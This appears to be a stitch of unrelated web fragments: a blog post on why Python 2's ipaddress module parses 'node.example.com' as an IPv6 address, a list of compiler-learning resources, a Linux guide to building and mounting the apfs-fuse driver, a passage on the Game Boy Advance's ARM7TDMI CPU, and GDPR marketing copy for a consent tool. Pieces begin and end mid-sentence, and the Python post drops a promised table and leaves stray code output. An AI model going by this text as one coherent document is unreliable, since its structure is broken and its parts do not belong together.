Port could </span><span>not </span><span>be cast to integer value </span><span>as</span><span> </span><span>'bf8b:e62c:abcd:1111:2222:3333:4444:8000'
</span></code></pre>
<p>Since IPv6 addresses use a "colon-hex" format with <a href="https://en.wikipedia.org/wiki/Hexadecimal">hexadecimal</a> fields
separated by <code>:</code> we can't tell a port apart from a normal field. Notice in the
example above that the hostname is truncated after the first <code>:</code>, not the one
just before <code>8000</code>.</p>
<p>Fortunately, the spec for URLs recognizes this ambiguity and gives us a way to
handle it. <a href="https://www.ietf.org/rfc/rfc2732.txt">RFC 2732 (<em>Format for Literal IPv6 Addresses in URL's</em>)</a>
says</p>
<blockquote>
<p>To use a literal IPv6 address in a URL, the literal address should be
enclosed in "[" and "]" characters.</p>
</blockquote>
<p>Update our example above to include <code>[</code> and <code>]</code> and voilà! It just works.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>url </span><span>= </span><span>urllib.parse.urlparse(
</span><span>...     </span><span>"https://[fdc8:bf8b:e62c:abcd:1111:2222:3333:4444]:8000"
</span><span>... )
</span><span>...
</span><span>&gt;&gt;&gt; </span><span>(url.hostname, url.port)
</span><span>(</span><span>'fdc8:bf8b:e62c:abcd:1111:2222:3333:4444'</span><span>, </span><span>8000</span><span>)
</span></code></pre>
<p>Armed with that knowledge we can dive into the problem. 🤿</p>

<p>A few months ago a co-worker of mine wrote a seemingly innocuous function.</p>
<pre><code><span>from </span><span>ipaddress </span><span>import </span><span>ip_address


</span><span>def </span><span>safe_host</span><span>(</span><span>host</span><span>): 
    </span><span>"""Surround `host` with brackets if it is an IPv6 address."""
    </span><span>try</span><span>:
        </span><span>if </span><span>ip_address(host)</span><span>.version </span><span>== </span><span>6</span><span>:
            </span><span>return </span><span>"[</span><span>{}</span><span>]"</span><span>.format(host)
    </span><span>except </span><span>ValueError</span><span>:
        </span><span>pass
    return </span><span>host
</span></code></pre>
<p>Elsewhere in the code it was invoked something like this, so that hostnames,
IPv4 addresses, and IPv6 addresses could all be safely interpolated.</p>
<pre><code><span>url </span><span>= </span><span>"https://</span><span>{host}</span><span>:8000/some/path/"</span><span>.format(host</span><span>=</span><span>safe_host(host))
</span></code></pre>
<p>Since my co-worker is awesome they wrote tests to validate their code. ✅</p>
<pre><code><span>def </span><span>test_safe_host_with_hostname</span><span>():
    </span><span>"""Hostnames should be unchanged."""
    </span><span>assert </span><span>safe_host(</span><span>"node.example.com"</span><span>) </span><span>== </span><span>"node.example.com"


</span><span>def </span><span>test_safe_host_with_ipv4_address</span><span>():
    </span><span>"""IPv4 addresses should be unchanged."""
    </span><span>assert </span><span>safe_host(</span><span>"192.168.0.1"</span><span>) </span><span>== </span><span>"192.168.0.1"


</span><span>def </span><span>test_safe_host_with_ipv6_address</span><span>():
    </span><span>"""IPv6 addresses should be surrounded by brackets."""
    </span><span>assert </span><span>(
        </span><span>safe_host(</span><span>"fdc8:bf8b:e62c:abcd:1111:2222:3333:4444"</span><span>)
        </span><span>== </span><span>"[fdc8:bf8b:e62c:abcd:1111:2222:3333:4444]"
    </span><span>)
</span></code></pre>
<p>Thank goodness they did. The Python 2 tests failed (<a href="https://tuckersiemens.com/posts/node-example-com-is-an-ip-address/#drop-python2">don't look at me like
that</a> 😒).</p>
<pre><code><span>✖ </span><span>FAIL</span><span> py27 in </span><span>1</span><span>.</span><span>83</span><span> seconds
✔ </span><span>OK</span><span> py36 in </span><span>2</span><span>.</span><span>82</span><span> seconds
✔ </span><span>OK</span><span> py37 in </span><span>2</span><span>.</span><span>621</span><span> seconds
✔ </span><span>OK</span><span> py38 in </span><span>2</span><span>.</span><span>524</span><span> seconds
✔ </span><span>OK</span><span> py39 in </span><span>2</span><span>.</span><span>461</span><span> seconds
</span></code></pre>
<p>Both the hostname and IPv6 address tests failed. But <em><strong>why</strong></em> did they fail?
And why did the Python 3 tests pass? 🤔</p>
<p>We'll start with the hostname failure and try to isolate the bug.</p>
<pre><code><span>E       </span><span>AssertionError</span><span>: </span><span>assert </span><span>'[node.example.com]' </span><span>== </span><span>'node.example.com'
</span><span>E         </span><span>- </span><span>[node.example.com]
E         ? </span><span>-                -
</span><span>E         </span><span>+ </span><span>node.example.com
</span></code></pre>
<p>The failure says <code>node.example.com</code> was surrounded by brackets, but that's
only supposed to happen for IPv6 addresses! Let's crack open a Python 2
interpreter for a quick sanity check.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>ipaddress.ip_address(</span><span>"node.example.com"</span><span>)</span><span>.version
</span><span>6
</span></code></pre><img src="https://tuckersiemens.com/posts/node-example-com-is-an-ip-address/confused-jeff-bridges.webp" alt="Confused Jeff Bridges">

<p>If, like Jeff Bridges, you were confused by that result, <em>relax</em>. We're
probably not in a <a href="https://en.wikipedia.org/wiki/Bizarro_World">Bizarro World</a> where <code>node.example.com</code> is a valid IPv6
address. There must be an explanation for this behavior.</p>
<p>Things start to become a little more clear when we see the result of the
<a href="https://github.com/python/cpython/blob/v3.9.0/Lib/ipaddress.py#L27-L54"><code>ip_address()</code></a> function for ourselves.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>ipaddress.ip_address(</span><span>"node.example.com"</span><span>)
IPv6Address(</span><span>u</span><span>'6e6f:6465:2e65:7861:6d70:6c65:2e63:6f6d'</span><span>)
</span></code></pre>
<p>At first glance that looks like madness. Python 3 behaves in an entirely
different manner.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>try</span><span>:
</span><span>...     </span><span>ipaddress.ip_address(</span><span>"node.example.com"</span><span>)
</span><span>... </span><span>except </span><span>ValueError </span><span>as </span><span>error:
</span><span>...     </span><span>print</span><span>(error)
</span><span>... 
</span><span>'node.example.com' </span><span>does </span><span>not </span><span>appear to be an IPv4 </span><span>or </span><span>IPv6 address
</span></code></pre>
<p>Python 3 knows that's not an IPv6 address, so why doesn't Python 2? The answer
is in how differently the two Python versions handle text.</p>

<p>Computers don't operate on text as humans think of it. They operate on numbers.
That's part of why we have IP addresses to begin with. In order to represent
human-readable text with computers we had to assign meaning to the numbers.
Thus, <a href="https://en.wikipedia.org/wiki/ASCII">ASCII</a> was born.</p>
<p>ASCII is a <a href="https://en.wikipedia.org/wiki/Character_encoding">character encoding</a>, which means it specifies how to interpret
<a href="https://en.wikipedia.org/wiki/Byte">bytes</a> as text we understand (provided you speak English). So, when your
computer sees <code>01101110</code> in <a href="https://en.wikipedia.org/wiki/Binary_number">binary</a> (<code>110</code> in <a href="https://en.wikipedia.org/wiki/Decimal">decimal</a>) you see <code>n</code> because
that's what ASCII says it is.</p>
<p>You can see the number to text conversion in action right in the Python
interpreter.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>ord</span><span>(</span><span>"n"</span><span>)
</span><span>110
</span><span>&gt;&gt;&gt; </span><span>chr</span><span>(</span><span>110</span><span>)
</span><span>'n'
</span></code></pre>
<p>In fact, it doesn't matter what numbering system you use. If you specify
binary, <a href="https://en.wikipedia.org/wiki/Octal">octal</a>, decimal, hexadecimal, whatever... If it can be understood as
the right integer it will be displayed correctly.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>chr</span><span>(</span><span>0b01101110</span><span>)
</span><span>'n'
</span><span>&gt;&gt;&gt; </span><span>chr</span><span>(</span><span>0o156</span><span>)
</span><span>'n'
</span><span>&gt;&gt;&gt; </span><span>chr</span><span>(</span><span>110</span><span>)
</span><span>'n'
</span><span>&gt;&gt;&gt; </span><span>chr</span><span>(</span><span>0x6e</span><span>)
</span><span>'n'

<p>Neat, but what does that information do for us?</p>

<p>Just for giggles, humor me and let's look at the character-number translations
for <code>node.example.com</code>. We'll leave out binary and octal, because they make
this table uglier than it already is.</p>

<p>Hey, hold on a second... If you tilt your head sideways and squint that last
row looks kinda like an IPv6 address, doesn't it?</p>
<p>We should verify, just to be absolutely certain. You've still got that Python 2
interpreter open, right?</p>

</span><span>True
</span></code></pre>
<p>Sure enough, when you boil them both down to numbers they're the same mess of
hexadecimal.</p>

<p>If we dig into the source code for the Python 2 version of the
<a href="https://github.com/phihag/ipaddress/blob/v1.0.23/ipaddress.py"><code>ipaddress</code></a> module we ultimately come to a
<a href="https://github.com/phihag/ipaddress/blob/v1.0.23/ipaddress.py#L2026-L2031">curious set of lines</a>.</p>
<pre><code><span># Constructing from a packed address
</span><span>if </span><span>isinstance</span><span>(address, </span><span>bytes</span><span>)</span><span>:
    </span><span>self._check_packed_address(address, </span><span>16</span><span>)
    </span><span>bvs </span><span>= </span><span>_compat_bytes_to_byte_vals(address)
    self</span><span>._ip </span><span>= </span><span>_compat_int_from_byte_vals(bvs, </span><span>'big'</span><span>)
    </span><span>return
</span></code></pre>
<p>It turns out that, under certain conditions, the <code>ipaddress</code> module can create
IPv6 addresses from raw bytes. My assumption is that it offers this behavior as
a convenient way to parse IP addresses from data fresh off the <a href="https://en.wikipedia.org/wiki/Wire_data">wire</a>.</p>
<p>Does <code>node.example.com</code> meet those certain conditions? You bet it does. Because
we're using Python 2 it's just <code>bytes</code> and it happens to be 16 characters long.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>isinstance</span><span>(</span><span>"node.example.com"</span><span>, </span><span>bytes</span><span>)
</span><span>True
</span><span>&gt;&gt;&gt; </span><span># `self._check_packed_address` basically just checks how long it is.
</span><span>&gt;&gt;&gt; </span><span>len</span><span>(</span><span>"node.example.com"</span><span>) </span><span>== </span><span>16
True
</span></code></pre>
<p>The rest of the <code>ipaddress</code> lines say to interpret the sequence of bytes as a
<a href="https://en.wikipedia.org/wiki/Endianness">big-endian</a> integer. That's <a href="https://docs.python.org/3.9/library/struct.html#struct.unpack">magic</a> best left
for another blog post, but the gist is that hexadecimal interpretation of
<code>node.example.com</code> is condensed into a single, <strong>huge</strong> number.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>int</span><span>(</span><span>"6e6f64652e6578616d706c652e636f6d"</span><span>, </span><span>16</span><span>)
</span><span>146793460745001871434687145741037825901</span><span>L
</span></code></pre>
<p>That's an absolutely massive number, but not so massive it won't fit within the
<a href="https://en.wikipedia.org/wiki/IPv6#Larger_address_space">IPv6 address space</a>.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>ip_address(</span><span>146793460745001871434687145741037825901</span><span>L</span><span>)
IPv6Address(</span><span>u</span><span>'6e6f:6465:2e65:7861:6d70:6c65:2e63:6f6d'</span><span>)
</span></code></pre>
<p>As it turns out, if you're liberal in your interpretation, <code>node.example.com</code>
<em>can</em> be an IPv6 address!</p>

<p>Obviously that's hogwash. Bizarro might be proud, but that's not what we wanted
to happen.</p>
<p>There's a quote about numbers which is apocryphally attributed to <a href="https://en.wikipedia.org/wiki/W._E._B._Du_Bois">W.E.B. Du
Bois</a>, but that actually comes from <a href="https://en.wikipedia.org/wiki/Harold_Geneen">Harold Geneen</a>'s book,
<a href="https://en.wikiquote.org/wiki/Harold_Geneen"><em>Managing</em></a>.</p>
<blockquote>
<p>When you have mastered the numbers, you will in fact no longer be reading
numbers, any more than you read words when reading a book. You will be
reading meanings.</p>
</blockquote>
<p>Having not read the book I'm probably taking the quote way out of context, but
I think it fits our situation well.</p>
<p>As we've seen above, we can freely convert characters to numbers and back
again. The root of our problem is that when we use Python 2 it considers text
to be bytes. There's not a deeper, inherent meaning. Maybe the bytes are meant
to be ASCII, maybe they're meant to be a long number, maybe they're meant to be
an IP address. The interpretation of those bytes is up to us.</p>
<p>Python 2 doesn't differentiate between bytes and text by default. In fact, the
<code>bytes</code> type is just an <a href="https://docs.python.org/3/whatsnew/2.6.html#pep-3112-byte-literals">alias</a> for <code>str</code>.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>bytes
</span><span>&lt;</span><span>type </span><span>'str'</span><span>&gt;
&gt;&gt;&gt; </span><span>bytes </span><span>is </span><span>str
</span><span>True
</span></code></pre>
<p>To make that even more concrete, see how Python 2 considers <code>n</code> to be the same
as this sequence of raw bytes.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>"n" </span><span>== </span><span>b</span><span>"\x6e"
</span><span>True
</span></code></pre>
<p>Our Python 2 code doesn't work the way we want it to because raw bytes can have
arbitrary meaning and we haven't told it to use our intended meaning.</p>
<p>So now we know why Python 2 interprets <code>node.example.com</code> as an IPv6 address,
but why does Python 3 behave differently? More importantly, how can we
reconcile the two?</p>

<p>ASCII looked like a good idea in the 1960's. With decades of hindsight we
know the 256 characters …</p></article></main></div></div>

<p>The virtual world (which is the only thing the sold out tickets are needed for) is really fun. It feels like debugging a DOS game in the 80/90s. Not much works but it is engaging enough to keep poking at things.</p>

        <p>Today I cleaned up my various projects and todo’s in <a href="https://www.omnigroup.com/omnifocus">OmniFocus</a>. I am always collecting links and resources for potential project ideas, or for general learning. Sometimes, however, it is best to acknowledge that I will likely never have enough free time to even begin some of these endeavors.</p>

<!--excerpt-->

<p>One thing I love about OmniFocus is the concept of “dropping” a project or task, which neither deletes the item nor marks it as complete — a feature sorely lacking in most “Todo” apps. Dropping an item is similar to deletion, but it preserves the record in case you would ever like to return to it. It is removed from view, but you can find it again by searching.</p>

<p>Today I decided to “drop” my compilers project in OmniFocus. I may return to it one day. Maybe not. In any case, I figured others in the community who want to learn about compilers might find these resources valuable. I have only skimmed them, but they should provide a good starting point. I hope you succeed where I did not.</p>

<p>All of these notes (among many others) are also in my <a href="https://github.com/jessesquires/TIL/blob/main/compilers/README.md">TIL repo</a> on GitHub.</p>

    <blockquote>
      <p>We all use compilers every day, but they still can seem like a mysterious black box at times. In this try! Swift talk, Samuel Giddins builds a tiny compiler for his made-up language 100% from scratch to get a feel for the basics of how compilers work.</p>

    <blockquote>
      <p>We’re going to start by going over the basic structure of a compiler. Then we’re going to build a lexer and a parser for Kaleidoscope. Then we’re going to take that parse data and we’re going to compile it to LLVM Intermediate Representation.</p>

      <p>These are things you can do on your own. I’ve arranged them roughly in order of difficulty and time commitment, although of course the language / environment you pick will affect things.</p>
    </blockquote>

  <li><a href="http://www.llvm.org/docs/tutorial/">LLVM tutorial</a>
    <blockquote>
      <p>This is the “Kaleidoscope” Language tutorial, showing how to implement a simple language using LLVM components in C++.</p>
    </blockquote>
  </li>
  <li><a href="http://www.craftinginterpreters.com/">Crafting interpreters</a>
    <blockquote>
      <p>This book contains everything you need to implement a full-featured, efficient scripting language. You’ll learn both high-level concepts around parsing and semantics and gritty details like bytecode representation and garbage collection. Your brain will light up with new ideas, and your hands will get dirty and calloused. It’s a blast.</p>

      <p>It’s a playground explaining how to create a tiny programming language (Mu).</p>

    <blockquote>
      <p>In my Advanced Compilers course last fall we spent some time poking around in the LLVM source tree. A million lines of C++ is pretty daunting but I found this to be an interesting exercise and at least some of the students agreed, so I thought I’d try to write up something similar. We’ll be using LLVM 3.9, but the layout isn’t that different for previous (and probably subsequent) releases.</p>

<p>In 2017, Apple changed the default filesystem on their macOS (High Sierra and above) to APFS, he Apple File System. It replaced HFS+.</p>



<p>It works on a principle of using containers, rather than partitions. It has good cloning efficiencies, better encrytion, snapshot support as well as a few other benefits. </p>




<h2><span id="Proprietary_prattle"></span>Proprietary prattle<span></span></h2>



<p>As all things recent in the Apple world, they do not like to share things. Even when this could negatively impact their business. Take FaceTime, for example. If they had made that platform agnostic, meaning that people on Windows, Android and maybe even Linux/Web platforms could use it, then it is arguable that FaceTime would have taken much of the market share from the likes of Skype. APFS is no different. Apple haven’t shared the API, so it relies on people to do an extent of guesswork, detailed research and some reverse engineering. All of which is never a good thing when you are working on the systems that look after the integrity of your files!</p>

<p>For those of you that use Linux on a mac and still have a need to access your files on the Mac partition of your hard drive on occasion then you may find it a challenge. If you have any version of macOS prior ot 10.3 (High Sierra), then your mac will be using HFS<a href="https://linuxnewbieguide.org/how-to-install-linux-on-a-macintosh-computer/">+. Check out our comprehensive guide on using Linux on a mac</a> on how to mount your HFS+ partition as read/write.<span data-ez-name="linuxnewbieguide_org-box-4"></span></p>



<h2><span id="How_do_I_get_it_working"></span>How do I get it working?<span></span></h2>



<p>For the newer APFS users, fortunately, you can now use a driver called <a href="https://github.com/sgan81/apfs-fuse">apfs-fuse </a>to access your mac’s APFS disk. Note that this driver is not part of your Linux distribution and you will have to build it from source code. This short guide will show you how. </p>



<h3><span id="Bummer,_Read_only%E2%80%A6"></span>Bummer, Read only….<span></span></h3>



<p>Unfortunately, at least for now, you are limited to read-only access. The upshot of this is that no data can be damaged by any bugs that may exist in this experimental software. The driver’s associated mount tool will also not perform transparent LZFSE decompression. I have been using this tool for a number of weeks on my ‘Mojave’ macOS computer and it works well.</p>



<h3><span id="Get_tooled_up"></span>Get tooled up<span></span></h3>



<p>Firstly, I’d like to say that this is an entirely newbie friendly tutorial, however on this occasion, it’s all work at the <a href="https://linuxnewbieguide.org/overview-of-chapters/more-advanced-guides/i-dont-know-any-commands/">Terminal</a>. Don’t worry too much if you’re not used to working at the command line, you are safe to copy and paste the instructions.</p>



<p>Firstly, we need to have the appropriate tools in order to build the APFS-Fuse driver. Open your Terminal app and enter these commands:</p>



<pre><code>sudo apt update
sudo apt install libicu-dev bzip2 cmake libz-dev libbz2-dev fuse3 libfuse3-3 libfuse3-dev clang git libattr1-dev

On older versions of Ubuntu, you may need to use the following: sudo apt install fuse libfuse-dev libicu-dev bzip2 cmake libz-dev libbz2-dev clang git libattr1-dev</code></pre>



<p>Now we can download (clone) the driver source code with git:</p>



<pre><code>git clone https://github.com/sgan81/apfs-fuse.git
cd apfs-fuse
git submodule init
git submodule update</code></pre>



<p>After that’s done, it’s time to compile the downloaded source code:</p>



<pre><code>mkdir build
cd build
cmake ..
make</code></pre>



<p>After compilation, the binaries are located in the build directory.  I recommend copying the apfs* tools into a directory that can be accessed in the path, for example /usr/local/bin. To copy them simply do this:</p>



<pre><code>sudo cp apfs-* /usr/local/bin</code></pre>



<p>Now we need to find out which disk partition macOS is on. By using the fdisk -l command you’ll be able to see the layout of the disk. </p>



<pre><code>$sudo fdisk -l
--- 8&gt;--snipped the loop volumes--&lt;8 ---
Disk /dev/sda: 465.9 GiB, 500277790720 bytes, 977105060 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 4096 bytes
I/O size (minimum/optimal): 4096 bytes / 4096 bytes
Disklabel type: gpt
Disk identifier: 6153AD88-FE14-4E88-8D9A-60E8AA465516

Device         Start       End   Sectors   Size Type
/dev/sda1         40    409639    409600   200M EFI System
/dev/sda2     409640 764593231 764183592 364.4G unknown
/dev/sda3  764594176 781570047  16975872   8.1G Microsoft basic data
/dev/sda4  781832192 976842751 195010560    93G Microsoft basic data
--- 8&gt;--snipped the loop volumes--&lt;8 ---</code></pre>



<p>You can see in my example above that there is a 364.4GB unknown partition. I know that this is my macOS partition because I know that the size of my macOS partition is 365GB. This means that the device identifier is /dev/sda2, so that’s what we will mount.</p>



<p>Let’s check it out and see if it works….</p>



<pre><code>sudo mkdir -p /media/$USERNAME/macos
sudo ./apfs-fuse -o allow_other /dev/sda2 /media/&lt;your userame&gt;/macos</code></pre>



<p>Hopefully, all going well, you won’t have received any error messages at this point. If you have, then perhaps the <a href="https://github.com/sgan81/apfs-fuse#apfs-fuse-driver-for-linux">README</a> file can provide some enlightenment. </p>

<h3><span id="Making_it_stick"></span>Making it stick<span></span></h3>



<p><span data-ez-name="linuxnewbieguide_org-medrectangle-4"></span>If you want to have your macos partition automatically mount every time you start up you computer, then you’ll need to edit into your filesystem table (fstab). To do this, we will need to make a symlink to the apfs mount tool, and then edit the fstab (if you don’t have nano, use vim):</p>



<pre><code>sudo ln -s /usr/local/bin/apfs-fuse /usr/sbin/mount.apfs
sudo nano /etc/fstab</code></pre>



<p>Add a line at the bottom of the file (all on one line) that says this:</p>



<pre><code>mount.apfs#/dev/sda2    /media/&lt;your username&gt;/macos/    fuse    user,allow_other        0       0</code></pre>



<p>If you want to see if that works immediately just unmount the disk (see the cleaning up section below). Then type sudo mount -a to mount the disk from the fstab.</p>



<h3><span id="Getting_to_know_your_partition"></span>Getting to know your partition<span></span></h3>



<p>When the partition is mounted, you will see two directories, private-dir and root. The directory root is the one you want. Inside there is the root filesystem of your mac. You’ll find your stuff in the ‘Users’ folder.</p>



<h3><span id="Cleaning_up_(Unmounting)"></span>Cleaning up (Unmounting)<span></span></h3>



<p>To unmount the macos directory properly, you should use the fusermount command:</p>



<pre><code>fusermount -u /media/&lt;your username&gt;/macos</code></pre>



<p>I hope this has helped you get access to your mac’s files. Please share this article and let me know how you get on in the comments section below.</p>

Additionally, it will introduce a relatively new CPU from a UK company that will surge in popularity in years to come.</p><hr><h2 id="cpu">CPU</h2><p>Most of the components are combined into a single package called <strong>CPU AGB</strong>. This package contains two completely different CPUs:</p><ul><li>A <strong>Sharp LR35902</strong> running at either 8.4 or 4.2 MHz: <em>If it isn’t the same CPU found on the Game Boy!</em> It’s effectively used to run Game Boy (<strong>DMG</strong>) and Game Boy Color (<strong>CGB</strong>) games. Here’s <a href="https://www.copetti.org/writings/consoles/game-boy/">my previous article</a> if you want to know more about it.</li><li>An <strong>ARM7TDMI</strong> running at 16.78 MHz: This is the new processor we’ll focus on, it most certainly runs Game Boy Advance games.</li></ul><p>Note that both CPUs will <strong>never run at the same time</strong> or do any fancy co-processing. The <strong>only</strong> reason for including the <em>very</em> old Sharp is for <strong>backwards compatibility</strong>.</p><h4 id="whats-new">What’s new?</h4><p>Before ARM Holdings (currently “Arm”) became incredibly popular in the smartphone world, they licensed their CPU designs to power Acorn’s computers, Apple’s Newton, Nokia’s phones and the Panasonic 3DO.
Nintendo’s chosen CPU, the ARM7TDMI, is based on the earlier ARM710 design, and includes:</p><ul><li><strong>ARM v4</strong> ISA: The 4th version of the 32-bit ARM instruction set.</li><li><strong>Three-stage pipeline</strong>: Execution of instructions are divided into three steps or <em>stages</em>. The CPU will fetch, decode and execute up to three instructions concurrently. This enables maximum use of the CPU’s resources (which reduces idle silicon) while also increasing the amount of instructions executed per unit of time.</li><li><strong>32-bit ALU</strong>: Can operate 32-bit numbers without consuming extra cycles.</li></ul><p>Moreover, this core contains some extensions referenced in its name (<em>TDMI</em>):</p><ul><li><strong>T</strong> → <strong>Thumb</strong>: A subset of the ARM instruction set whose instructions are encoded into 16-bit words.<ul><li>Being 16-bit, Thumb instructions require half the bus width and occupy half the memory. However, since Thumb instructions offer only a functional subset of ARM you may have to write more instructions to achieve the same effect.</li><li>Thumb only offers conditional execution on branches, its data processing ops use a two-address format, rather than three-address, and it only has access to the bottom half of the register file.</li><li>In practice Thumb uses 70% of the space of ARM code. For 16-bit wide memory Thumb runs <em>faster</em> than ARM.</li><li>If required, ARM and Thumb instructions can be mixed in the same program (called <em>interworking</em>) so developers can choose when and where to use each mode.</li></ul></li><li><strong>D</strong> → <strong>Debug Extensions</strong>: Provide JTAG debugging.</li><li><strong>M</strong> → <strong>Enhanced Multiplier</strong>: Previous ARM cores required multiple cycles to compute full 32-bit multiplications, this enhancement reduces it to just a few.</li><li><strong>I</strong> → <strong>EmbeddedICE macrocell</strong>: Debug module that allows hardware breakpoints, watchpoints and allows the system to be halted while debugging.</li></ul><h4 id="memory-locations">Memory locations</h4><p>The inclusion of Thumb in particular had a strong influence on the final design of this console. Nintendo mixed 16-bit and 32-bit buses between its different modules to reduce costs while providing programmers with the necessary resources to optimise their code. Usable memory is distributed across the following locations:</p><ul><li><strong>IWRAM</strong> (Internal WRAM) → 32-bit with 32 KB: Useful for storing ARM instructions and data in big chunks.</li><li><strong>EWRAM</strong> (External WRAM) → 16-bit with 256 KB: Optimised for storing Thumb-only instructions and data in small chunks.</li><li><strong>PAK ROM</strong> -&gt; 16-bit with variable size: This is the place where the cartridge ROM is accessed.</li><li><strong>Cart RAM</strong> -&gt; 16-bit with variable size: This is the place where the cartridge RAM is accessed.</li></ul><p>Although this console was marketed as a 32-bit system, the majority of its memory is only accessible through a 16-bit bus, meaning games will mostly use the Thumb instruction set to avoid spending two cycles per instruction fetch. Only critical sections should use the ARM instruction set.</p><h4 id="how-do-they-maintain-compatibility">How do they maintain compatibility?</h4><p>You’ll be surprised that there is no software implemented to detect whether the cartridge inserted is a GB or GBA one. Instead, the console relies on hardware switches: A <strong>shape detector</strong> effectively identifies the type of cartridge and then only passes power through the required bus.</p><hr><h2 id="graphics">Graphics</h2><p>Before we begin, you’ll find the system a mix between the <a href="https://www.copetti.org/writings/consoles/super-nintendo/#graphics">SNES</a> and the <a href="https://www.copetti.org/writings/consoles/game-boy/#graphics">Game Boy</a>, the graphics core is still the well-known 2D engine called <strong>PPU</strong>. I recommend reading those articles before continuing since I’ll be revisiting lots of previously-explained concepts.</p><p>Compared to previous Game Boys we now have a colour LCD screen that can display up to 32,768 colours (15-bit). It has a resolution of 240x160 pixels and a refresh rate of ~60Hz.</p><h4 id="organising-the-content">Organising the content</h4><div><a href="https://www.copetti.org/images/consoles/gba/ppu.594d9adaab26ddb8264ac4e9044b40087fa77a612048e2bc7b749475beecede9.png"><picture>

<p><span>16 April 2019</span></p><p>
The GDPR is a new regulation by the EU. It changes a lot regarding how every website goes about doing their business. Even non EU-based sites and businesses are affected. You have to <b>make your website GDPR compliant</b>. Or you’re facing serious fines – up to € 20 million, or more, believe it or not.
</p>

<li><a href="#the-impact-on-email-marketing">The impact on email marketing</a></li>
<li><a href="#how-uniconsent-cmp-works-for-gdpr">How UniConsent CMP works for GDPR</a></li>
</ul>

<p>The GDPR lays out specific requirements for businesses and organizations who are established in Europe or who serve users in Europe. It:</p>
<ul>
<li> Regulates how businesses can collect, use, and store personal data</li>
<li> Builds upon current documentation and reporting requirements to increase accountability</li>
<li> Authorizes fines on businesses who fail to meet its requirements</li>
</ul>

<p>Individuals, organisations, and companies that are either 'controllers' or 'processors' of personal data will be covered by the GDPR.</p>

<p>Normally the website owner and the publisher. But as an agency, you might have a responsibility to your clients to make their websites GDPR compliant.</p>
<h3 id="gdpr-is-real-the-gdpr-fines-and-news">GDPR is real, the GDPR fines and news</h3>
<blockquote>"Google hit with £44m GDPR fine over ads" - BBC News</blockquote>
<blockquote>Google fined £44m for breaching EU privacy laws - The Independent</blockquote>
<blockquote>Bounty UK fined £400,000 for sharing personal data unlawfully - ICO UK</blockquote>
<blockquote>"Facebook recently transferred 1.5 billion of its international users from the jurisdiction of its European headquarters, in Ireland, to that of its US headquarters, with some speculating this was to avoid costly legal action resulting from breaches of the EU's General Data Protection Regulation (GDPR)." - BBC</blockquote>

<p>To be fully compliant with the GDPR law, a website has to fulfil three requirements:</p>
<p>It must present visitors with information about the cookies the site uses, and their purpose. </p>
<p>It must obtain consent to use those cookies. In most cases, consent can be implied, but sometimes it must be explicit.</p>
<p>It should provide a mechanism for visitors to withdraw consent, and then respond to withdrawal by preventing further use of cookies.</p>
<p>Cookie compliance for GDPR is provided by UniConsent CMP cookie discovery feature.</p>
<h3 id="the-impact-on-online-advertising">The impact on online advertising</h3>
<p>There are two types of online advertising: <b>contextual targeting doesn’t require personal data</b> and personalised targeting based on personal data collected from the users.</p>
<p>GDPR will not just have an impact on how marketers can collect data but how they use it to create personalised and targeted online advertising.</p>
<p>Some think online targeting advertising will shift away from the use of personal data almost entirely as a result of GDPR.</p>
<p>Using UniConsent CMP, marketers are able to collect consent from users about how to use personal data</p>
<p>UniConsent CMP integrates with common ad servers like Google Doubleclick for Publishers and header bidding technologies.</p>
<p>Publishers are able to keep their website GDPR compliance by providing users with the choices about if serving personalised ads and collecting personal data automatically.</p>
<h3 id="the-impact-on-email-marketing">The impact on email marketing</h3>
<p><b>You need user’s consent before sending marketing Email. </b></p>
<p>Marketers cannot send emails without an unambiguous consent given by your users.</p>
<p>Marketers must define the purpose for collecting the data and then ask the users to opt-in (given by choice) for each segment of the service you wish to offer an opt-out which should be mandatory.</p>
<p>Simple General statements like “by signing up you agree to the basic rules, Terms of service and privacy policy” is not EU GDPR compliant.</p>
<p><img alt="GDPR custom purpose" src="https://www.uniconsent.com/images/custom-purpose.png"></p>
<h3 id="website-hosting-server-and-service">Website hosting server and service</h3>
<p>In order to enable your compliance with the GDPR, your hosting provider should include specific measures such as:</p>
<ul>
<li> Encryption of personal data</li>
<li> Ability to ensure the ongoing confidentiality, integrity, availability, and resilience of processing systems and services
&amp; Ability to restore the availability and access to personal data in a timely manner in the event of a physical or technical incident</li>
<li> Processes for regularly testing, assessing, and evaluating the effectiveness of technical and organizational measures for ensuring the security of processing</li>
</ul>
<p>AWS gives the best set of tools to become compliant.</p>
<p>“Today, I’m very pleased to announce that AWS services comply with the General Data Protection Regulation (GDPR). This means that, in addition to benefiting from all of the measures that AWS already takes to maintain services security, customers can deploy AWS services as a key part of their GDPR compliance plans.” - AWS</p>
<p>This means moving or migrate your website onto AWS can be a key part of your GDPR compliance plan.</p>
<p>Looking for migrating your website to AWS? Check <a href="https://www.transfon.com/services/managed-service#managed">Managed Cloud and servers service</a>.</p>

<p>The common issues about GDPR Consent implementation are:</p>
<ul>
<li>No GDPR CMP installed, no consent process at all.</li>
<li>Simply put a GDPR CMP tag on website, recording user's choice, but not implement features like "blocking cookies" desired by a user. </li>
<li>Doesn't support Google DFP, Google Ads. Even a user disable personalised ads at a consent manager. Because Google DFP is not supported by the consent manager, personalised ads are delivered to the user, thus user's personal data are collected.</li>
</ul>

<p>GDPR affects advanced Ads users who are running campaigns targeting EEA countries.</p>

<h4>IAB Europe certified CMP</h4>
<p>UniConsent is certified by IAB EU with CMP #68.</p>
<p>It is built based on IAB Europe Transparency &amp; Consent Framework (Framework).</p>
<p>IAB Europe Transparency &amp; Consent Framework (Framework) has a simple objective to help all parties in the digital advertising chain ensure that they comply with the EU’s General Data Protection Regulation and ePrivacy Directive when processing personal data or accessing and/or storing information on a user’s device, such as cookies, advertising identifiers, device identifiers and other tracking technologies.</p>
